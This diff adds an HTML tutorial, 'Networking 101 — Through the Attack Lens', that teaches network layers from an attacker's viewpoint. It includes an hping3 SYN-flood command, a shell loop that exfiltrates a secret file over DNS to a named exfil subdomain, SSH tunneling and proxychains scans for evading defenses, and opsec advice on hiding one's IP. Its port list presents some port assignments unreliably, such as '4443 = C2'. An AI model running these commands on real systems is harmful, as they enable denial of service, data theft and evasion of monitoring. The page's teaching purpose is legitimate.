@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NETWORKING 101 — 22nd Survey Division</title>
+<style>
+  :root {
+    --bg: #0c0c0c;
+    --fg: #cccccc;
+    --green: #0f0;
+    --red: #f44;
+    --yellow: #ff0;
+    --cyan: #0ff;
+    --magenta: #f0f;
+    --amber: #ffb000;
+    --prompt: #0f0;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .terminal {
+    max-width: 900px;
+    margin: 0 auto;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(0,255,255,0.1);
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+  }
+  .header h1 {
+    color: var(--cyan);
+    font-size: 24px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+  }
+  .header p {
+    color: #666;
+    margin-top: 10px;
+  }
+  .tabs {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+  .tab {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    color: #888;
+    padding: 10px 20px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.3s;
+    text-transform: uppercase;
+    font-size: 12px;
+    letter-spacing: 1px;
+  }
+  .tab:hover {
+    border-color: var(--cyan);
+    color: var(--cyan);
+  }
+  .tab.active {
+    background: var(--cyan);
+    color: #000;
+    border-color: var(--cyan);
+  }
+  .content {
+    display: none;
+  }
+  .content.active {
+    display: block;
+  }
+  .cmd-block {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 15px;
+    margin-bottom: 15px;
+  }
+  .prompt {
+    color: var(--prompt);
+  }
+  .command {
+    color: var(--fg);
+  }
+  .output {
+    color: #888;
+    margin-top: 8px;
+    padding-left: 20px;
+  }
+  .highlight {
+    color: var(--cyan);
+  }
+  .warning {
+    color: var(--red);
+  }
+  .suspicious {
+    color: var(--amber);
+  }
+  .note {
+    color: var(--magenta);
+    font-style: italic;
+    margin-top: 10px;
+    padding: 10px;
+    background: #1a1a1a;
+    border-left: 3px solid var(--magenta);
+  }
+  .osi-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 15px 0;
+  }
+  .osi-table th, .osi-table td {
+    border: 1px solid #333;
+    padding: 10px;
+    text-align: left;
+  }
+  .osi-table th {
+    background: #1a1a1a;
+    color: var(--yellow);
+    text-transform: uppercase;
+    font-size: 12px;
+  }
+  .osi-table td {
+    color: #bbb;
+  }
+  .osi-table .layer {
+    color: var(--cyan);
+    font-weight: bold;
+  }
+  .packet-diagram {
+    background: #0a0a0a;
+    border: 1px solid #333;
+    border-radius: 4px;
+    padding: 15px;
+    margin: 15px 0;
+    font-family: monospace;
+    white-space: pre;
+    color: #888;
+  }
+  .run-btn {
+    background: var(--green);
+    color: #000;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: monospace;
+    font-weight: bold;
+    text-transform: uppercase;
+    margin-top: 15px;
+  }
+  .run-btn:hover {
+    background: #0a0;
+  }
+</style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="header">
+    <h1>Networking 101 — Through the Attack Lens</h1>
+    <p>First Principle: Every layer is an attack surface. You don't need to be a network engineer. You need to know where to stab.</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('osi')">OSI Model</button>
+    <button class="tab" onclick="showTab('tcp')">TCP/IP</button>
+    <button class="tab" onclick="showTab('ports')">Ports</button>
+    <button class="tab" onclick="showTab('dns')">DNS</button>
+    <button class="tab" onclick="showTab('wireshark')">Wireshark</button>
+    <button class="tab" onclick="showTab('tunnel')">Tunneling</button>
+  </div>
+
+  <div id="osi" class="content active">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// OSI MODEL — ATTACKER'S VIEW</span>
+    </div>
+    
+    <table class="osi-table">
+      <tr>
+        <th>Layer</th>
+        <th>Name</th>
+        <th>Attack Surface</th>
+      </tr>
+      <tr>
+        <td class="layer">7</td>
+        <td>Application</td>
+        <td>HTTP request smuggling, DNS poisoning, payload delivery</td>
+      </tr>
+      <tr>
+        <td class="layer">6</td>
+        <td>Presentation</td>
+        <td>SSL stripping, encoding bypasses</td>
+      </tr>
+      <tr>
+        <td class="layer">5</td>
+        <td>Session</td>
+        <td>Session hijacking, cookie theft</td>
+      </tr>
+      <tr>
+        <td class="layer">4</td>
+        <td>Transport</td>
+        <td>SYN flood, port scanning, session hijacking</td>
+      </tr>
+      <tr>
+        <td class="layer">3</td>
+        <td>Network</td>
+        <td>IP spoofing, fragmentation attacks, routing manipulation</td>
+      </tr>
+      <tr>
+        <td class="layer">2</td>
+        <td>Data Link</td>
+        <td>ARP spoofing, MAC flooding, VLAN hopping</td>
+      </tr>
+      <tr>
+        <td class="layer">1</td>
+        <td>Physical</td>
+        <td>Cable tapping, rogue access points</td>
+      </tr>
+    </table>
+    
+    <div class="note">You live at L2, L4, and L7. Everything else is for specialists.</div>
+  </div>
+
+  <div id="tcp" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">Test-NetConnection -ComputerName 8.8.8.8 -TraceRoute</span>
+      <div class="output">
+        ComputerName      : 8.8.8.8<br>
+        RemoteAddress     : 8.8.8.8<br>
+        PingSucceeded     : True<br>
+        TraceRoute        : {192.168.1.1, 10.20.26.193, 203.221.3.65, 72.14.243.130...}<br>
+        InterfaceAlias    : WiFi<br>
+        SourceAddress     : 192.168.1.92
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// TCP HANDSHAKE — 3 packets to open, 1 RST to close</span>
+    </div>
+    
+    <div class="packet-diagram">
+Client          Server
+  | SYN    →     |
+  |    ← SYN-ACK |
+  | ACK    →     |
+  |              |
+  | DATA   ↔     |
+  |              |
+  | RST    →     |  (or FIN-ACK)
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// SYN FLOOD — DoS by never completing handshake</span>
+      <div class="output">
+        hping3 -S -p 80 --flood 192.168.1.42<br>
+        # Send SYNs, never complete. Server resources exhausted.
+      </div>
+    </div>
+    
+    <div class="note">Three packets to open. One RST to close. Everything in between is your attack surface.</div>
+  </div>
+
+  <div id="ports" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS&gt;</span> <span class="command">Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort</span>
+      <div class="output">
+        LocalAddress LocalPort OwningProcess<br>
+        ------------ --------- -------------<br>
+        0.0.0.0             22          7008<br>
+        0.0.0.0            135          1720<br>
+        192.168.1.92      139             4<br>
+        0.0.0.0            445             4<br>
+        ::                <span class="suspicious">1337</span>          9180  <span class="warning">← PostgreSQL on leet port</span><br>
+        0.0.0.0           <span class="suspicious">4443</span>         31248  <span class="warning">← C2 listener</span><br>
+        0.0.0.0           <span class="suspicious">8080</span>          6464  <span class="warning">← Apache web server</span><br>
+        0.0.0.0           9012          2068<br>
+        0.0.0.0           9013          2068<br>
+        ::                9051         10056<br>
+        ::                9090         34760
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// WELL-KNOWN PORTS — MEMORIZE THESE</span>
+      <div class="output">
+        22   SSH<br>
+        80   HTTP<br>        443  HTTPS<br>
+        445  SMB<br>        3389 RDP<br>
+        5985 WinRM<br>
+        4443 C2 (non-standard)<br>
+        1337 PostgreSQL (non-standard)
+      </div>
+    </div>
+    
+    <div class="note">Every open port is a conversation. 4443 = C2. 1337 = PostgreSQL. 8080 = Apache. Know your own surface.</div>
+  </div>
+
+  <div id="dns" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS&gt;</span> <span class="command">Resolve-DnsName 22div.com.au</span>
+      <div class="output">
+        Name                           Type   TTL   Section    IPAddress<br>
+        ----                           ----   ---   -------    ---------<br>
+        22div.com.au                   A      3600  Answer     203.0.113.42
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// DNS RESOLUTION CHAIN</span>
+      <div class="output">
+        User → Local DNS (router) → ISP DNS → Root (.com) → TLD (google.com) → Authoritative (www.google.com)
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// DNS EXFILTRATION — encode data in subdomains</span>
+      <div class="output">
+        base64 secret.txt | tr '+/' '-_' | fold -w 63 | while read chunk; do<br>
+          nslookup "$chunk.exfil.22div.com.au"<br>
+        done<br>
+        # DNS queries always get out. Firewalls block HTTP. DNS is allowed.
+      </div>
+    </div>
+    
+    <div class="note">DNS is the weakest link. Every query gets out. Encode data in subdomains. The firewall won't stop it.</div>
+  </div>
+
+  <div id="wireshark" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// WIRESHARK CAPTURE FILTERS</span>
+      <div class="output">
+        host 192.168.1.92      # Only this IP<br>
+        port 80                # Only this port<br>
+        tcp                    # Only TCP<br>
+        portrange 1-1024       # Well-known ports only
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// WIRESHARK DISPLAY FILTERS</span>
+      <div class="output">
+        ip.addr == 192.168.1.92<br>
+        http.request.method == "GET"<br>
+        tcp.port == 4443<br>
+        dns.qry.name contains "exfil"<br>
+        ssl.handshake.type == 1
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// WHAT TO LOOK FOR</span>
+      <div class="output">
+        • Unencrypted HTTP (passwords in plaintext)<br>
+        • SMB traffic (file shares, lateral movement)<br>
+        • DNS queries (what domains the target visits)<br>
+        • Unusual ports (C2 beacons)<br>
+        • Large outbound transfers (exfiltration)
+      </div>
+    </div>
+    
+    <div class="note">Wireshark is the attacker's microscope. Every packet is a cell. Look for the anomaly.</div>
+  </div>
+
+  <div id="tunnel" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// SSH TUNNELING — ROUTE AROUND DEFENSES</span>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">ssh -L 8080:internal.target.com:80 user@jumpbox</span>
+      <div class="output">
+        # Local port forward: your port → target's port through jumpbox<br>
+        # Browse localhost:8080 → reaches internal.target.com:80
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">ssh -D 1080 user@jumpbox</span>
+      <div class="output">
+        # Dynamic SOCKS proxy on localhost:1080<br>
+        # Route anything through it: proxychains nmap -sT 10.0.0.0/24
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// RED TEAM OPSEC — DON'T BURN YOUR IP</span>
+      <div class="output">
+        # Chain: You → VPN → VPS → Target<br>
+        ssh -D 1080 user@vps.22div.com.au<br>
+        proxychains nmap -sT 10.0.0.0/24<br><br>
+        # If target logs your IP → sees VPS<br>
+        # If VPS seized → sees VPN<br>
+        # If VPN keeps logs → sees you<br>
+        # Layer your opsec.
+      </div>
+    </div>
+    
+    <div class="note">SSH is a tunnel, not just a shell. Route traffic through jumpboxes. Layer your opsec.</div>
+  </div>
+
+  <div style="text-align: center; margin-top: 40px; color: #666; font-size: 12px;">
+    Networking 101 — Through the Attack Lens. Every layer is a surface.
+  </div>
+</div>
+
+<script>
+function showTab(tabId) {
+  // Hide all content
+  document.querySelectorAll('.content').forEach(content => {
+    content.classList.remove('active');
+  });
+  
+  // Remove active from all tabs
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.classList.remove('active');
+  });
+  
+  // Show selected content
+  document.getElementById(tabId).classList.add('active');
+  
+  // Activate selected tab
+  event.target.classList.add('active');
+}
+</script>
+
+</body>
+</html>
